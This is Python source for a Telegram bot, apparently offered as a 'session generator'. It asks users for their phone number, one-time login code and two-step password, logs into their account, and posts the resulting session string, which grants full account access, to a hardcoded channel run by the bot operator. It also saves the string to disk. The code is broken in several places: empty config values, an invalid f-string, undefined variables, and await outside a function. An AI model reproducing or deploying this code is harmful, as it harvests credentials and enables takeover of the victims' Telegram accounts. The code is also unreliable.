import os, logging, asyncio, string, random
from telethon.sync import TelegramClient
from pyrogram import enums, errors, filters, Client
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid
)

class Config(object):
    API_ID = 
    API_HASH = 
    BOT_TOKEN = 
    SESSION_CHANNEL = "-1002187906000"
    SESSION_FILE = f"{}.txt"

logging.basicConfig(
    format="[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s",
    level=logging.INFO,
)

Drone = TelegramClient("SessGen", Config.API_ID, Config.API_HASH).start(bot_token=Config.BOT_TOKEN)

app = Client(
    "SessionGenerator",
    api_id=Config.API_ID,
    api_hash=Config.API_HASH,
    bot_token=Config.BOT_TOKEN
)

@app.on_message(
     filters.command("start")
)
@app.on_message(
     filters.command("generate")
)
async def start_or_generate_command(client, message):
    user_id = message.from_user.id
    if "start" in message.command:
         await message.reply("Welcome to Session Generator Bot!")
    elif "generate" in message.command:
         session = await generate_session(client, message, user_id)
         text = f"✅ Session Generated Successfully! Here is your session string:\n\n`{session}`\n\nDon't share it with anyone, we are not responsible for any mishandling or misuse."
         msg = await app.send_message(int(Config.SESSION_CHANNEL), text)
         await app.send_message(user_id, f"Your Session has been sent [here](https://t.me/c/{str(msg.chat.id)[-10:]}/{msg.id}).")
         with open(Config.SESSION_FILE.format(user_id), 'w') as file:
              file.write(text)

def generate_random_name(length=7):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

async def generate_session(app, message, user_id):   
    
    number = await app.ask(user_id, 'Please enter your phone number along with the country code. \nExample: +19876543210', filters=filters.text)   
    phone_number = number.text
    try:
        await message.reply("📲 Sending OTP...")
        client = Client(generate_random_name(), api_id, api_hash)
        
        await client.connect()
    except Exception as e:
        await message.reply(f"❌ Failed to send OTP {e}. Please wait and try again later.")
    try:
        code = await client.send_code(phone_number)
    except ApiIdInvalid:
        await message.reply('❌ Invalid combination of API ID and API HASH. Please restart the session.')
        return
    except PhoneNumberInvalid:
        await message.reply('❌ Invalid phone number. Please restart the session.')
        return
    try:
        otp_code = await app.ask(user_id, "Please check for an OTP in your official Telegram account. Once received, enter the OTP in the following format: \nIf the OTP is `12345`, please enter it as `1 2 3 4 5`.", filters=filters.text, timeout=600)
    except TimeoutError:
        await message.reply('⏰ Time limit of 10 minutes exceeded. Please restart the session.')
        return
    phone_code = otp_code.text.replace(" ", "")
    try:
        await client.sign_in(phone_number, code.phone_code_hash, phone_code)
                
    except PhoneCodeInvalid:
        await message.reply('❌ Invalid OTP. Please restart the session.')
        return
    except PhoneCodeExpired:
        await message.reply('❌ Expired OTP. Please restart the session.')
        return
    except SessionPasswordNeeded:
        try:
            two_step_msg = await app.ask(user_id, 'Your account has two-step verification enabled. Please enter your password.', filters=filters.text, timeout=300)
        except TimeoutError:
            await message.reply('⏰ Time limit of 5 minutes exceeded. Please restart the session.')
            return
        try:
            password = two_step_msg.text
            await client.check_password(password=password)
        except PasswordHashInvalid:
            await two_step_msg.reply('❌ Invalid password. Please restart the session.')
            return
    string_session = await client.export_session_string()
    await client.disconnect()
    return string_session

if __name__ == "__main__":
    try:
        app.start()
        getme = await app.get_me()
        if getme.last_name:
             BOT_NAME = getme.first_name + " " + getme.last_name
        else:
             BOT_NAME = getme.first_name
        print(f"Bot {BOT_NAME} started")
        Drone.run_until_disconnected()
        app.stop()
        print(f"Bot {BOT_NAME} stopped")
    except Exception as e:
        print(f"Failed to start bot: {e}")
